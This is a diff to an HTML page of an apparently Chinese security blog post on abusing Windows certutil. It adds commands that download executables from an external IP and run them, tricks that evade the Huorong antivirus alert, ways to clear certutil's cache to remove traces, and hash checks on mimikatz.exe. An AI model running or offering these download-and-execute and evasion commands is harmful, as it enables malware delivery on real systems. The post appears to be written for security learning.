@@ -380,7 +380,21 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210924141912563.png" alt="image-20210924141912563"></p>
+          <pre><code>普通的下载命令:
+certutil -urlcache -split -f http://test.com/360.exe</code></pre><p><img src="/2021/09/24/CertUtil深度学习/image-20210924141912563.png" alt="image-20210924141912563"></p>
+<p>可以看到火绒都报警了，简单绕过(火绒。。。过不了只要是下载exe字段都会报警):</p>
+<pre><code class="cmd">certutil &amp;amp; certutil -urlcache -split -f http://test.com/360.exe
+certutil | certutil -urlcache -split -f http://test.com/360.exe
+certutil | certutil -urlcache -split -f http://47.99.168.203/fastjson反序列化分析2.scr &amp;&amp; .\fastjson反序列化分析2.scr</code></pre>
+<p>certutil会产生很多缓存:</p>
+<pre><code class="cmd">certutil -urlcache *</code></pre>
+<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210924144024588.png" alt="image-20210924144024588"></p>
+<p>如何让certutil命令没有缓存:</p>
+<pre><code>certutil -urlcache -split -f http://io.com delete</code></pre><p>当然也可以清除完:</p>
+<pre><code>certutil -urlcache * delete</code></pre><h3><span id="certutil-校验hash值">certutil 校验hash值</span></h3><pre><code>certutil -hashfile mimikatz.exe MD5
+certutil -hashfile mimikatz.exe SHA1   //检验SHA1
+certutil -hashfile mimikatz.exe SHA256 //检验SHA256</code></pre><p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210924153722960.png" alt="image-20210924153722960"></p>
+<p>学习参考:<a href="https://forum.butian.net/share/612" target="_blank" rel="noopener">https://forum.butian.net/share/612</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -409,9 +423,26 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2021/09/24/网站源码get/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                网站源码get</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2021/09/16/sql深度利用/" rel="next">
               <div class="background">
